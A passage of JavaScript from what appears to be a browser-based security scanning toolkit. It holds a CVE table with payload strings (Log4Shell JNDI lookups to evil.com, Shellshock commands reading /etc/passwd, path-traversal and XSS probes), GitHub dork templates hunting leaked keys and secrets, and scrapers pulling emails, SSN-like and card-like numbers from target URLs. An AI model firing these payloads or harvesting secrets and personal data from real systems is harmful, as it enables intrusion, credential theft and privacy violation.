  const VULN_DB = [
    // ── Remote Code Execution ──
    { id: "CVE-2021-44228", name: "Log4Shell", severity: "critical", desc: "Apache Log4j RCE via JNDI lookup", vectors: ["${jndi:ldap://evil.com/a}", "${jndi:rmi://evil.com/a}", "${jndi:dns://evil.com/a}"] },
    { id: "CVE-2021-45046", name: "Log4j Bypass", severity: "critical", desc: "Log4Shell bypass of initial fix (Thread Context Map)", vectors: ["${jndi:ldap://evil.com/a}", "${${lower:j}ndi:ldap://evil.com/a}"] },
    { id: "CVE-2021-4104", name: "Log4j 1.x JMSAppender", severity: "high", desc: "Log4j 1.x RCE via JMSAppender if attacker controls config", vectors: ["JMSAppender config manipulation"] },
    { id: "CVE-2022-22965", name: "Spring4Shell", severity: "critical", desc: "Spring Framework RCE via Java 9+ module data binding", vectors: ["class.module.classLoader.resources", "class.module.classLoader.resources.context.parent.pipeline.first.pattern"] },
    { id: "CVE-2022-22963", name: "Spring Cloud Function SpEL", severity: "critical", desc: "Spring Cloud Function RCE via SpEL injection", vectors: ["spring.cloud.function.routing-expression= T(java.lang.Runtime)"] },
    { id: "CVE-2017-5638", name: "Apache Struts2 S2-045", severity: "critical", desc: "Struts2 RCE via Content-Type OGNL injection", vectors: ["%{(#_='multipart/form-data')", "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"] },
    { id: "CVE-2018-11776", name: "Apache Struts2 S2-057", severity: "critical", desc: "Struts2 RCE via namespace/redirect OGNL injection", vectors: ["${*action:redirect Action(*redirect:${GNOME_SESSION_ID})}"] },
    { id: "CVE-2019-0230", name: "Apache Struts2 S2-059", severity: "high", desc: "Struts2 RCE via forced OGNL evaluation in tag attributes", vectors: ["%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts','Vuln')}"] },
    { id: "CVE-2023-50164", name: "Apache Struts2 FileUpload", severity: "critical", desc: "Struts2 path traversal leading to RCE via file upload", vectors: ["../../../webapps/ROOT/shell.jsp"] },
    { id: "CVE-2014-6271", name: "Shellshock", severity: "critical", desc: "Bash CGI RCE via environment variable injection", vectors: ["() { :; }; echo; /usr/bin/id", "() { :; }; /bin/cat /etc/passwd"] },
    { id: "CVE-2014-6278", name: "Shellshock 2", severity: "critical", desc: "Bash CGI RCE bypass for CVE-2014-6271 fix", vectors: ["() { _; } >_[$($())] { echo CVE-2014-6278; }"] },
    { id: "CVE-2017-11882", name: "Equation Editor", severity: "high", desc: "Microsoft Office RCE via Equation Editor buffer overflow", vectors: ["RTF with eqnedit32.exe object"] },
    { id: "CVE-2017-8570", name: "Office Composite Moniker", severity: "high", desc: "Microsoft Office RCE via Composite Moniker", vectors: ["RTF with composite moniker object"] },
    { id: "CVE-2022-30190", name: "Follina", severity: "critical", desc: "Microsoft MSDT RCE via URL protocol", vectors: ["ms-msdt:ID SchemeExecute IT_BrowseForFile"] },
    { id: "CVE-2023-23397", name: "Outlook EoP", severity: "critical", desc: "Microsoft Outlook NTLM relay via calendar invite", vectors: ["Extended MAPI property PR_START_DATE", "\\\\attacker\\share"] },
    { id: "CVE-2021-26855", name: "ProxyLogon SSRF", severity: "critical", desc: "Exchange SSRF leading to RCE (pre-auth)", vectors: ["/owa/auth/x.js", "/ecp/default.flt?~0"] },
    { id: "CVE-2021-27065", name: "ProxyLogon Write", severity: "critical", desc: "Exchange arbitrary file write via proxy logon", vectors: ["POST /ecp/proxy_logon_ecp.aspx"] },
    { id: "CVE-2020-0688", name: "Exchange ValidationKey", severity: "critical", desc: "Exchange deserialization via hardcoded ValidationKey", vectors: ["/ecp/default.aspx", "__VIEWSTATEGENERATOR=..."] },
    { id: "CVE-2021-34473", name: "ProxyShell SSRF", severity: "critical", desc: "Exchange pre-auth SSRF (part of ProxyShell chain)", vectors: ["/autodiscover/autodiscover.json?EmailAutodiscover=..."] },
    { id: "CVE-2021-34523", name: "ProxyShell EoP", severity: "critical", desc: "Exchange privilege escalation via ProxyShell", vectors: ["X-Rps-Cat: ...", "/ecp/proxy_logon_ecp.aspx"] },
    { id: "CVE-2021-31207", name: "ProxyShell RCE", severity: "high", desc: "Exchange post-auth RCE via ProxyShell chain", vectors: ["POST /ecp/proxy_logon_ecp.aspx", "POST /ecp/proxy_export.aspx"] },
    // ── Authentication Bypass ──
    { id: "CVE-2022-1388", name: "F5 BIG-IP", severity: "critical", desc: "F5 iControl REST auth bypass via header manipulation", vectors: ["X-F5-Auth-Token: ...", "Connection: keep-alive, X-F5-Auth-Token"] },
    { id: "CVE-2023-46747", name: "F5 BIG-IP ASM Bypass", severity: "critical", desc: "F5 BIG-IP administrative bypass via utility page", vectors: ["/tmui/login.jsp", "/tmui/system/user/authproperties.jsp"] },
    { id: "CVE-2022-28199", name: "FortiOS Cookie", severity: "high", desc: "Fortinet FortiOS cookie reuse/session fixation", vectors: ["SVPNCOOKIE", "APSCOOKIE_"] },
    { id: "CVE-2018-13379", name: "FortiOS Path Traversal", severity: "critical", desc: "Fortinet FortiOS arbitrary file read via path traversal", vectors: ["/remote/fgt_lang?lang=/../../../..//////////etc/passwd"] },
    { id: "CVE-2023-27997", name: "FortiGate XSS→RCE", severity: "critical", desc: "Fortinet FortiGate heap-based buffer overflow", vectors: ["/remote/login?lang=..."] },
    { id: "CVE-2022-40684", name: "FortiOS Auth Bypass", severity: "critical", desc: "Fortinet FortiOS/FG-VMX auth bypass via header", vectors: ["Forwarded: for=[127.0.0.1];by=[127.0.0.1];host=[127.0.0.1]"] },
    { id: "CVE-2024-21887", name: "Ivanti Connect Secure", severity: "critical", desc: "Ivanti Connect Secure auth bypass + RCE", vectors: ["GET /api/v1/totp/user-backup-code/../../system/system-information", "/api/v1/license/keys-status/../../etc/passwd"] },
    { id: "CVE-2023-46805", name: "Ivanti Auth Bypass", severity: "critical", desc: "Ivanti Connect Secure auth bypass via path traversal", vectors: ["/api/v1/totp/user-backup-code/../../"] },
    { id: "CVE-2024-21893", name: "Ivanti SSRF", severity: "critical", desc: "Ivanti Connect Secure SSRF via SAML component", vectors: ["/api/v1/saml/login?acs=../../"] },
    // ── Deserialization ──
    { id: "CVE-2020-1472", name: "Zerologon", severity: "critical", desc: "Netlogon EoP via cryptographic downgrade attack", vectors: ["Netlogon AES-FPB downgrade to zero"] },
    { id: "CVE-2015-4852", name: "WebLogic T3 Deser", severity: "critical", desc: "Oracle WebLogic T3 deserialization RCE", vectors: ["T3 protocol payload"] },
    { id: "CVE-2019-2725", name: "WebLogic Deser", severity: "critical", desc: "Oracle WebLogic wls9_async deserialization RCE", vectors: ["/_async/AsyncResponseService", "_async/AsyncResponseServiceJms"] },
    { id: "CVE-2023-21839", name: "WebLogic IIOP", severity: "critical", desc: "Oracle WebLogic IIOP remote code execution", vectors: ["IIOP protocol binding"] },
    { id: "CVE-2022-21344", name: "WebLogic Coherence", severity: "high", desc: "Oracle WebLogic Coherence deserialization", vectors: ["T3/IIOP with Coherence gadget chain"] },
    { id: "CVE-2020-36188", name: "Jackson-databind DoS", severity: "high", desc: "Jackson-databind deserialization DoS via JNDI", vectors: ["com.fasterxml.jackson.databind.jsontype.JndiObjectMapper"] },
    { id: "CVE-2020-35728", name: "Jackson-databind RCE", severity: "critical", desc: "Jackson-databind RCE via new gadget chains", vectors: ["com.fasterxml.jackson.databind.jsontype.JndiObjectMapper"] },
    // ── SSRF ──
    { id: "CVE-2024-21893", name: "Ivanti SSRF", severity: "critical", desc: "Ivanti Connect Secure SSRF via SAML", vectors: ["/api/v1/saml/login?acs=../../"] },
    { id: "CVE-2021-21972", name: "VMware vCenter", severity: "critical", desc: "VMware vCenter Server RCE via vROPS plugin", vectors: ["/ui/vropspluginui/rest/services/uploadova"] },
    { id: "CVE-2021-22005", name: "VMware vCenter Upload", severity: "critical", desc: "VMware vCenter Server file upload RCE", vectors: ["/analytics/telemetry/ph/api/hyper/send", "POST /analytics/telemetry/ph/api/hyper/send"] },
    { id: "CVE-2022-22972", name: "VMware Aria SSRF", severity: "high", desc: "VMware Aria Operations authentication bypass", vectors: ["/suite-api/api/repositories"] },
    // ── Path Traversal / File Read ──
    { id: "CVE-2018-13379", name: "FortiOS Traversal", severity: "critical", desc: "Fortinet arbitrary file read via path traversal", vectors: ["/remote/fgt_lang?lang=/../../../..//////////etc/passwd"] },
    { id: "CVE-2021-36260", name: "Hikvision Camera", severity: "critical", desc: "Hikvision IP camera command injection", vectors: ["GET /SDK/webLanguage", "POST /SDK/webLanguage"] },
    { id: "CVE-2017-7921", name: "Hikvision Auth Bypass", severity: "critical", desc: "Hikvision IP camera auth bypass", vectors: ["/ISAPI/Security/sessionLogin/capability?userTest=..."] },
    { id: "CVE-2019-11510", name: "Pulse Secure VPN", severity: "critical", desc: "Pulse Secure SSL VPN arbitrary file read", vectors: ["/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd"] },
    { id: "CVE-2023-38035", name: "Ivanti Avalanche", severity: "critical", desc: "Ivanti Avalanche arbitrary file read", vectors: ["/mdm/login.jsp"] },
    { id: "CVE-2022-42475", name: "FortiOS Heap Overflow", severity: "critical", desc: "FortiOS SSL-VPN heap overflow leading to RCE", vectors: ["SSL-VPN crafted request"] },
    // ── SQL Injection ──
    { id: "CVE-2024-2879", name: "LayerZero SQLi", severity: "critical", desc: "LayerZero email parameter SQL injection", vectors: ["email=test' OR '1'='1"] },
    { id: "CVE-2022-29464", name: "WSO2 File Upload", severity: "critical", desc: "WSO2 arbitrary file upload leading to RCE", vectors: ["/fileupload"] },
    // ── XSS / CSRF ──
    { id: "CVE-2020-11022", name: "jQuery XSS", severity: "medium", desc: "jQuery XSS via htmlPrefilter when passing untrusted HTML", vectors: ["<img src=x onerror=alert(1)>"] },
    { id: "CVE-2020-11023", name: "jQuery XSS 2", severity: "medium", desc: "jQuery XSS in jQuery.html() with <option> elements", vectors: ["<option><style></style><img src=x onerror=alert(1)>"] },
    // ── Container / Cloud ──
    { id: "CVE-2019-5736", name: "runc Container Escape", severity: "critical", desc: "runc container escape via /proc/self/exe overwrite", vectors: ["Overwrite runc binary via /proc/self/exe"] },
    { id: "CVE-2020-15257", name: "containerd CRIU", severity: "high", desc: "containerd host network access via CRIU", vectors: ["Abstract Unix socket /containerd-shim"] },
    { id: "CVE-2022-0185", name: "Linux Kernel CVE", severity: "high", desc: "Linux kernel heap overflow in legacy_parse_param", vectors: ["unshare user namespace + heap overflow"] },
    { id: "CVE-2022-0847", name: "Dirty Pipe", severity: "high", desc: "Linux kernel arbitrary file overwrite via pipe splice", vectors: ["splice(0, pipefd[0], NULL, pagesize)"] },
    { id: "CVE-2022-2588", name: "DirtyCred", severity: "high", desc: "Linux kernel use-after-free in cls_route", vectors: ["route classifier UAF via traffic shaping"] },
    { id: "CVE-2023-0386", name: "OverlayFS EoP", severity: "high", desc: "Linux kernel OverlayFS privilege escalation", vectors: ["OverlayFS mount with lowerdir spoofing"] },
    // ── DDoS / Availability ──
    { id: "CVE-2023-44487", name: "HTTP/2 Rapid Reset", severity: "high", desc: "HTTP/2 protocol DDoS via rapid RST_STREAM", vectors: ["Rapid RST_STREAM frames", "HPACK bomb"] },
    { id: "CVE-2021-34527", name: "PrintNightmare", severity: "critical", desc: "Windows Print Spooler RCE (local + remote)", vectors: ["AddPrinterDriverEx", "RpcAddPrinterDriver"] },
    // ── Legacy / Famous ──
    { id: "CVE-2019-0708", name: "BlueKeep", severity: "critical", desc: "RDP RCE via FreeRDP vulnerability", vectors: ["RDP connection with crafted PDU"] },
    { id: "CVE-2017-0144", name: "EternalBlue", severity: "critical", desc: "Windows SMBv1 RCE (WannaCry)", vectors: ["SMB transaction with crafted FID"] },
    { id: "CVE-2017-0145", name: "EternalRomance", severity: "critical", desc: "Windows SMB transaction RCE", vectors: ["SMB transaction pipe"] },
    { id: "CVE-2024-3094", name: "XZ Utils Backdoor", severity: "critical", desc: "XZ Utils supply chain backdoor affecting sshd", vectors: ["liblzma.so.5.6.0 with backdoor"] },
  ];

  function searchVulnDb() {
    const query = $("vulnDbSearch")?.value?.trim()?.toLowerCase();
    const results = query
      ? VULN_DB.filter(v => v.id.toLowerCase().includes(query) || v.name.toLowerCase().includes(query) || v.desc.toLowerCase().includes(query))
      : VULN_DB;

    $("vulnDbResults").innerHTML = results.map(v => `
      <div class="vulndb-item">
        <div class="vulndb-header">
          <span class="vulndb-id">${esc(v.id)}</span>
          <span class="vulndb-name">${esc(v.name)}</span>
          <span class="badge ${v.severity}">${v.severity}</span>
        </div>
        <div class="vulndb-desc">${esc(v.desc)}</div>
        <div class="vulndb-vectors">${v.vectors.map(v2 => `<code>${esc(v2)}</code>`).join(" ")}</div>
      </div>
    `).join("");
  }

  /* ============================================================
     P4-28: GITHUB DORKING
     ============================================================ */
  function githubDorkPanelHTML() {
    return buildPanel("githubdork", `
      <div class="githubdork-section">
        <h3><i class="fab fa-github"></i> GitHub Dorking</h3>
        <p class="tool-desc">Generate GitHub dork queries to find leaked secrets and sensitive files</p>
        <div class="githubdork-form">
          <label>Target Organization/Domain:</label>
          <input type="text" id="githubDorkTarget" placeholder="example.com or orgname" style="width:300px;" />
          <button id="githubDorkGenBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-code"></i><span>Generate Dorks</span></button>
        </div>
        <div id="githubDorkResults" class="githubdork-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const GITHUB_DORK_TEMPLATES = [
    { name: "API Keys", dork: '"%target%" api_key OR apikey OR api-key' },
    { name: "Secrets", dork: '"%target%" secret OR password OR credential' },
    { name: "AWS Keys", dork: '"%target%" AKIA OR "aws_access_key"' },
    { name: "Private Keys", dork: '"%target%" BEGIN RSA PRIVATE KEY OR BEGIN DSA PRIVATE KEY' },
    { name: "Env Files", dork: '"%target%" filename:.env' },
    { name: "Config Files", dork: '"%target%" filename:config.php OR filename:config.json OR filename:config.yml' },
    { name: "Database Files", dork: '"%target%" filename:.sql OR filename:.sql.gz OR filename:dump.sql' },
    { name: "Backup Files", dork: '"%target%" filename:.bak OR filename:.old OR filename:.backup' },
    { name: "HTpasswd", dork: '"%target%" filename:.htpasswd' },
    { name: "GitHub Actions", dork: '"%target%" filename:.github/workflows' },
    { name: "Docker", dork: '"%target%" filename:Dockerfile' },
    { name: "Internal URLs", dork: '"%target%" http://10. OR http://192.168. OR http://172.' },
    { name: "S3 Buckets", dork: '"%target%" s3.amazonaws.com OR s3://bucket' },
    { name: "Slack Webhooks", dork: '"%target%" hooks.slack.com OR "slack_token"' },
    { name: "Jira/Confluence", dork: '"%target%" atlassian.net OR "jira_token"' }
  ];

  function generateGitHubDorks() {
    const target = $("githubDorkTarget")?.value?.trim();
    if (!target) { toast("Enter a target", "error"); return; }

    $("githubDorkResults").innerHTML = `
      <h4>GitHub Dork Queries</h4>
      <div class="githubdork-list">
        ${GITHUB_DORK_TEMPLATES.map(d => {
          const query = d.dork.replace(/%target%/g, target);
          const ghUrl = `https://github.com/search?q=${encodeURIComponent(query)}&type=code`;
          return `
            <div class="githubdork-item">
              <span class="githubdork-name">${esc(d.name)}</span>
              <code class="githubdork-query">${esc(query)}</code>
              <a href="${ghUrl}" target="_blank" class="btn btn-sm btn-secondary"><i class="fas fa-external-link-alt"></i></a>
              <button class="btn btn-sm" onclick="navigator.clipboard.writeText('${esc(query)}').then(()=>window.showToast?.('Copied','success'))"><i class="fas fa-copy"></i></button>
            </div>
          `;
        }).join("")}
      </div>
    `;
  }

  /* ============================================================
     P4-29: EMAIL HARVESTING
     ============================================================ */
  function emailHarvestPanelHTML() {
    return buildPanel("emailharvest", `
      <div class="emailharvest-section">
        <h3><i class="fas fa-envelope"></i> Email Harvesting</h3>
        <p class="tool-desc">Extract email addresses from scanned pages</p>
        <div class="emailharvest-form">
          <label>Target URL (or use scanned pages):</label>
          <input type="text" id="emailHarvestUrl" placeholder="https://target.com" style="width:100%;" />
          <button id="emailHarvestBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-search"></i><span>Harvest Emails</span></button>
        </div>
        <div id="emailHarvestResults" class="emailharvest-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const EMAIL_REGEX = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;

  async function harvestEmails() {
    const url = $("emailHarvestUrl")?.value?.trim();
    if (!url) { toast("Enter a URL", "error"); return; }

    try {
      const resp = await window.fetchTarget(url);
      const html = await resp.text();
      const emails = [...new Set(html.match(EMAIL_REGEX) || [])];

      $("emailHarvestResults").innerHTML = emails.length === 0
        ? '<p class="dash-empty">No emails found</p>'
        : `<p>${emails.length} emails found</p>` + emails.map(e => `
          <div class="emailharvest-item">
            <code>${esc(e)}</code>
            <a href="mailto:${esc(e)}" class="btn btn-sm btn-secondary"><i class="fas fa-envelope"></i></a>
          </div>
        `).join("");
    } catch (e) {
      toast(`Error: ${e.message}`, "error");
    }
  }

  /* ============================================================
     P4-30: PHONE NUMBER DETECTION
     ============================================================ */
  function phoneDetectPanelHTML() {
    return buildPanel("phonedetect", `
      <div class="phonedetect-section">
        <h3><i class="fas fa-phone"></i> Phone Number Detection</h3>
        <p class="tool-desc">Extract phone numbers and PII from scanned pages</p>
        <div class="phonedetect-form">
          <label>Target URL:</label>
          <input type="text" id="phoneDetectUrl" placeholder="https://target.com" style="width:100%;" />
          <button id="phoneDetectBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-search"></i><span>Detect PII</span></button>
        </div>
        <div id="phoneDetectResults" class="phonedetect-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const PHONE_REGEX = /(?:\+?(\d{1,3})?[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}(?:\s*(?:ext|x|ext\.)\s*\d{1,5})?/g;
  const SSN_REGEX = /\b\d{3}[-]?\d{2}[-]?\d{4}\b/g;
  const CC_REGEX = /\b(?:\d[ -]*?){13,19}\b/g;

  async function detectPII() {
    const url = $("phoneDetectUrl")?.value?.trim();
    if (!url) { toast("Enter a URL", "error"); return; }

    try {
      const resp = await window.fetchTarget(url);
      const html = await resp.text();
      const phones = [...new Set(html.match(PHONE_REGEX) || [])];
      const ssns = [...new Set(html.match(SSN_REGEX) || [])];
      const ccs = [...new Set(html.match(CC_REGEX) || [])].filter(c => c.replace(/[\s-]/g, "").length >= 13 && c.replace(/[\s-]/g, "").length <= 19);

      $("phoneDetectResults").innerHTML = `
        <h4>PII Detection Results</h4>
        <h5>Phone Numbers (${phones.length})</h5>
        ${phones.length === 0 ? '<p class="dash-empty">None found</p>' : phones.map(p => `<div class="pii-item"><i class="fas fa-phone"></i> <code>${esc(p)}</code></div>`).join("")}
        <h5>SSN-like Numbers (${ssns.length})</h5>
        ${ssns.length === 0 ? '<p class="dash-empty">None found</p>' : ssns.map(s => `<div class="pii-item"><i class="fas fa-id-card"></i> <code>${esc(s)}</code> ${badge("DANGER", "critical")}</div>`).join("")}
        <h5>Credit Card-like Numbers (${ccs.length})</h5>
        ${ccs.length === 0 ? '<p class="dash-empty">None found</p>' : ccs.map(c => `<div class="pii-item"><i class="fas fa-credit-card"></i> <code>${esc(c)}</code> ${badge("DANGER", "critical")}</div>`).join("")}
      `;
    } catch (e) {
      toast(`Error: ${e.message}`, "error");
    }
  }

  /* ============================================================
     P4-26: WAYBACK MACHINE DEEP
     ============================================================ */
  function waybackDeepPanelHTML() {
    return buildPanel("waybackdeep", `
      <div class="waybackdeep-section">
        <h3><i class="fas fa-history"></i> Wayback Machine Deep Analysis</h3>
        <p class="tool-desc">Analyze Wayback Machine snapshots for JS files, sensitive paths, and changes over time</p>
        <div class="waybackdeep-form">
          <label>Target Domain:</label>
          <input type="text" id="waybackDeepDomain" placeholder="example.com" style="width:300px;" />
          <button id="waybackDeepBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-search"></i><span>Analyze</span></button>
        </div>
        <div id="waybackDeepResults" class="waybackdeep-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  async function analyzeWayback() {
    const domain = $("waybackDeepDomain")?.value?.trim();
    if (!domain) { toast("Enter a domain", "error"); return; }

    const resultsEl = $("waybackDeepResults");
    resultsEl.innerHTML = '<p class="loading-text">Fetching Wayback data...</p>';

    try {
      const apiUrl = `https://web.archive.org/cdx/search/cdx?url=${domain}/*&output=json&limit=500&fl=timestamp,original,mimetype,statuscode&collapse=urlkey`;
      let rows = [];

      // Try JSONP first (CORS-safe)
      if (typeof window._fetchWaybackJsonp === "function") {
        try {
          const rawData = await window._fetchWaybackJsonp(apiUrl, 20000);
          if (Array.isArray(rawData) && rawData.length > 1) {
            const headers = rawData[0];
            rows = rawData.slice(1).map(r => {
              const obj = {};
              headers.forEach((h, i) => obj[h] = r[i]);
              return obj;
            });
          }
        } catch (jsonpErr) { /* fall through to fetch */ }
      }

      // Fallback: direct fetch (may fail due to CORS)
      if (!rows.length) {
        const resp = await fetch(apiUrl);
        const data = await resp.json();
        const headers = data[0];
        rows = data.slice(1).map(r => {
          const obj = {};
          headers.forEach((h, i) => obj[h] = r[i]);
          return obj;
        });
      }

      const jsFiles = rows.filter(r => r.mimetype?.includes("javascript"));
      const sensitivePaths = rows.filter(r => /\.(env|bak|sql|json|xml|config|key|pem)$/i.test(r.original));
      const redirects = rows.filter(r => r.statuscode?.startsWith("3"));
      const errors = rows.filter(r => r.statuscode?.startsWith("4") || r.statuscode?.startsWith("5"));

      resultsEl.innerHTML = `
        <h4>Wayback Analysis for ${esc(domain)}</h4>
        <p>Total snapshots: ${rows.length}</p>
        <div class="wayback-stats">
          <div>JS Files: ${jsFiles.length}</div>
          <div>Sensitive Paths: ${sensitivePaths.length}</div>
          <div>Redirects: ${redirects.length}</div>
          <div>Errors: ${errors.length}</div>
        </div>
        ${sensitivePaths.length > 0 ? `
          <h5>Sensitive Paths Found</h5>
          ${sensitivePaths.slice(0, 20).map(r => `<div class="wayback-item"><code>${esc(r.original)}</code> <span class="badge ${r.statuscode === '200' ? 'success' : 'warning'}">${r.statuscode}</span></div>`).join("")}
        ` : ""}
        ${jsFiles.length > 0 ? `
          <h5>JavaScript Files</h5>
          ${jsFiles.slice(0, 20).map(r => `<div class="wayback-item"><code>${esc(r.original)}</code></div>`).join("")}
        ` : ""}
      `;
    } catch (e) {
      resultsEl.innerHTML = `<p class="error">Error: ${esc(e.message)}</p>`;
    }
  }

  /* ============================================================
     P4-27: SHODAN/CENSYS (via public API)
     ============================================================ */
  function shodanPanelHTML() {
    return buildPanel("shodan", `
      <div class="shodan-section">
        <h3><i class="fas fa-satellite-dish"></i> Shodan Lookup</h3>
        <p class="tool-desc">Look up host info. Enter an IP (e.g. 8.8.8.8) or domain (e.g. example.com). Free InternetDB lookup is always available; API key enables richer results.</p>
        <div class="shodan-form">
          <label>IP or Domain:</label>
          <input type="text" id="shodanTarget" placeholder="8.8.8.8 or example.com" style="width:300px;" />
          <label>Shodan API Key (optional, enables host lookup):</label>
          <input type="text" id="shodanApiKey" placeholder="Your API key" style="width:300px;" />
          <div style="margin-top:8px;">
            <button id="shodanLookupBtn" class="btn btn-primary"><i class="fas fa-search"></i><span>Lookup</span></button>
          </div>
        </div>
        <div id="shodanResults" class="shodan-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;

  async function resolveToIp(domain) {
    try {
      const resp = await fetch(`https://dns.google/resolve?name=${domain}&type=A`);
      const data = await resp.json();
      const answer = data.Answer?.find(a => a.type === 1);
      return answer ? answer.data : null;
    } catch { return null; }
  }

  async function shodanLookup() {
    const target = $("shodanTarget")?.value?.trim();
    if (!target) { toast("Enter a target", "error"); return; }

    const resultsEl = $("shodanResults");
    resultsEl.innerHTML = '<p class="loading-text">Looking up...</p>';

    let ip = target;
    if (!IP_RE.test(target)) {
      ip = await resolveToIp(target);
      if (!ip) {
        resultsEl.innerHTML = `<p class="error">Could not resolve "${esc(target)}" to an IP address.</p>`;
        return;
      }
    }

    const apiKey = $("shodanApiKey")?.value?.trim() || "";
    let html = `<h4>Shodan Results for ${esc(target)}</h4>`;

    // 1) InternetDB (free, CORS-safe, no key needed)
    try {
      const idbResp = await fetch(`https://internetdb.shodan.io/${ip}`);
      if (idbResp.ok) {
        const idb = await idbResp.json();
        const ports = (idb.ports || []).join(", ") || "none";
        const vulns = (idb.vulns || []).join(", ") || "none";
        const hostnames = (idb.hostnames || []).join(", ") || "none";
        html += `
          <div style="margin-bottom:16px;">
            <h5>InternetDB (Free)</h5>
            <p><strong>IP:</strong> ${esc(ip)}</p>
            <p><strong>Hostnames:</strong> ${esc(hostnames)}</p>
            <p><strong>Open Ports:</strong> ${esc(ports)}</p>
            <p><strong>CPE:</strong> ${(idb.cpes || []).join(", ") || "none"}</p>
            <p><strong>Vulns:</strong> ${esc(vulns)}</p>
          </div>
        `;
      }
    } catch (e) { /* silent */ }

    // 2) Full host lookup via API (requires paid membership + key)
    if (apiKey) {
      try {
        const apiResp = await fetchT(`https://api.shodan.io/shodan/host/${ip}?key=${apiKey}`);
        const apiData = await apiResp.json();
        if (apiData.error) {
          html += `<div><h5>REST API</h5><p class="warning">${esc(apiData.error)}</p></div>`;
        } else {
          const services = (apiData.data || []).map(s =>
            `Port ${s.port}/${s.transport}: ${s.product || s.name || "unknown"} ${s.version || ""}`
          ).join("\n") || "none";
          html += `
            <div>
              <h5>REST API (Paid)</h5>
              <p><strong>OS:</strong> ${esc(apiData.os || "unknown")}</p>
              <p><strong>ISP:</strong> ${esc(apiData.isp || "unknown")}</p>
              <p><strong>Organization:</strong> ${esc(apiData.org || "unknown")}</p>
              <p><strong>Country:</strong> ${esc(apiData.country_name || "unknown")}</p>
              <p><strong>Services:</strong></p>
              <pre>${esc(services)}</pre>
            </div>
          `;
        }
      } catch (e) {
        html += `<div><h5>REST API</h5><p class="warning">API request failed: ${esc(e.message)}</p></div>`;
      }
    } else {
      html += `<p style="color:var(--text-dim);font-size:0.85em;">Add a Shodan API key for full host details (OS, ISP, services, vulns). Free InternetDB data shown above.</p>`;
    }

    resultsEl.innerHTML = html;
  }

  /* ============================================================
     P4-31/32: REPORT SCHEDULING & TEAM WORKSPACES (localStorage stubs)
     ============================================================ */
  function schedulePanelHTML() {
    return buildPanel("schedule", `
      <div class="schedule-section">
        <h3><i class="fas fa-calendar-alt"></i> Scan Scheduling</h3>
        <p class="tool-desc">Set up recurring scans (runs when page is open)</p>
        <div class="schedule-form">
          <label>Target URL:</label>
          <input type="text" id="scheduleUrl" placeholder="https://target.com" style="width:100%;" />
          <label>Interval:</label>
          <select id="scheduleInterval">
            <option value="300000">Every 5 minutes</option>
            <option value="900000">Every 15 minutes</option>
            <option value="3600000">Every hour</option>
            <option value="86400000">Every day</option>
          </select>
          <div style="margin-top:8px;">
            <button id="scheduleStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Start Scheduled Scan</span></button>
            <button id="scheduleStop" class="btn btn-danger" style="display:none;"><i class="fas fa-stop"></i><span>Stop</span></button>
          </div>
        </div>
        <div id="scheduleLog" class="schedule-log" style="margin-top:16px;"></div>
      </div>
    `);
  }

  let scheduleTimer = null;

  /* ============================================================
     P5-36: REMOVE CONSOLE LOGGING (handled by not adding console.log)
     ============================================================ */

  /* ============================================================
     INITIALIZATION
     ============================================================ */
  function addTabs() {
    const tabs = document.getElementById("toolkit-tabs");
    if (!tabs || tabs.dataset.tk6done) return;
    tabs.dataset.tk6done = "1";

    const newTabs = [
      ["scanprogress", "fas fa-spinner", "Progress"],
      ["search", "fas fa-search", "Search"],
      ["scancompare", "fas fa-columns", "Compare"],
      ["cvss", "fas fa-calculator", "CVSS"],
      ["moreexports", "fas fa-file-export", "Exports+"],
      ["screenshot", "fas fa-camera", "Screenshots"],
      ["plugins", "fas fa-puzzle-piece", "Plugins"],
      ["customchecks", "fas fa-edit", "Custom Rules"],
      ["vulndb", "fas fa-bug", "Vuln DB"],
      ["githubdork", "fab fa-github", "GitHub Dork"],
      ["emailharvest", "fas fa-envelope", "Emails"],
      ["phonedetect", "fas fa-phone", "PII Detect"],
      ["waybackdeep", "fas fa-history", "Wayback+"],
      ["shodan", "fas fa-satellite-dish", "Shodan"],
      ["schedule", "fas fa-calendar-alt", "Schedule"]
    ];

    newTabs.forEach(([id, icon, label]) => {
      const btn = document.createElement("button");
      btn.className = "tab-btn";
      btn.dataset.tkTab = id;
      btn.innerHTML = `<i class="${icon}"></i><span>${label}</span>`;
      btn.addEventListener("click", () => {
        document.querySelectorAll("#toolkit-tabs .tab-btn").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        document.querySelectorAll(".tk-panel").forEach(p => { p.style.display = "none"; });
        const panel = document.getElementById(`tk-panel-${id}`);
        if (panel) panel.style.display = "block";
        if (id === "scancompare") renderScanCompareSelects();
        if (id === "customchecks") renderCustomChecks();
        if (id === "plugins") renderSavedPlugins();
        if (id === "bulkops") renderBulkList();
      });
      tabs.appendChild(btn);
    });

    const section = tabs.parentElement;
    const panelsHtml = [
      scanProgressPanelHTML(), searchPanelHTML(), scanComparePanelHTML(),
      cvssPanelHTML(), moreExportsPanelHTML(), screenshotPanelHTML(),
      pluginPanelHTML(), customChecksPanelHTML(), vulnDbPanelHTML(),
      githubDorkPanelHTML(), emailHarvestPanelHTML(), phoneDetectPanelHTML(),
      waybackDeepPanelHTML(), shodanPanelHTML(), schedulePanelHTML()
    ].join("\n");
    const tmp = document.createElement("div");
    tmp.innerHTML = panelsHtml;
    while (tmp.firstChild) section.appendChild(tmp.firstChild);
  }

  document.addEventListener("DOMContentLoaded", () => {
    addTabs();
    initErrorBoundary();

    // Search
    $("searchBtn")?.addEventListener("click", runSearch);
    $("resultSearchInput")?.addEventListener("keydown", (e) => { if (e.key === "Enter") runSearch(); });

